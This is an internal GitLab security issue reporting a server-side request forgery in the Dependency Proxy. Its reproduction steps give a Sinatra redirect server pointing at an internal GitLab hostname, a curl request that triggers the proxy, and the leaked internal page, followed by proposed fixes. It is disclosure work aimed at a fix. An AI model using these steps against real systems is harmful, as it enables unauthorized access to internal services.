

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# SSRF via Dependency Proxy

### Summary

Using a custom Maven URL for the Dependency Proxy it is possible to achieve full-read GET based Same Site Request Forgery by HTTP redirects.

### Steps to reproduce

1. Go to [https://gitlab.com/$PROJECTPATH/-/settings/packages\_and\_registries](https://gitlab.com/%24PROJECTPATH/-/settings/packages_and_registries) and set a HTTP URL you control
2. The HTTP Server under that URL should respond with a redirect to an internal URL e.g.:

```
require 'sinatra'

get "/*" do
  redirect "https://zoekt.gprd.gke.gitlab.net"
end
```

3. Send a request to the dependency proxy for that project

```
curl 'https://gitlab.com/api/v4/projects/$PROJECTID/dependency_proxy/packages/maven/foo/1/a3' -H Private-Token:\ $GITLAB_API_PRIVATE_TOKEN
```

4. Observe the response:

```
<html>

<head>
[... shortened ...]
      <p class="navbar-text navbar-right">
        Used 2518M mem for
        34759405 documents (254G)
        from 124995 repositories.
      </p>
    </div>
  </nav>
</body>
</html>
```

### What is the current *bug* behavior?

SSRF to internal resources is possible

### What is the expected *correct* behavior?

Workhorse should not follow redirects to internal resources when downloading dependencies on behalf of the dependency proxy.

### Output of checks

This bug happens on GitLab.com

### Possible fixes

The [typical SSRF checks](https://docs.gitlab.com/ee/development/secure_coding_guidelines.html#server-side-request-forgery-ssrf) should be implemented [here](https://gitlab.com/gitlab-org/gitlab/blob/9f04c2234bf6ba4f4a7619d1718afab5a26accfe/workhorse/internal/dependencyproxy/dependencyproxy.go#L128-L136) and for our Go code in general, just like in our [Ruby code for HTTP requests](https://gitlab.com/gitlab-org/gitlab/-/tree/master/gems/gitlab-http). The Workhorse `send-url` feature is likely affected by this as well but I didn't find any way to supply user controlled HTTP hosts to it.

---

cc [@gitlab-com/gl-security/appsec](/gitlab-com/gl-security/appsec "GitLab.com / GitLab Security Department / Application Security")

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

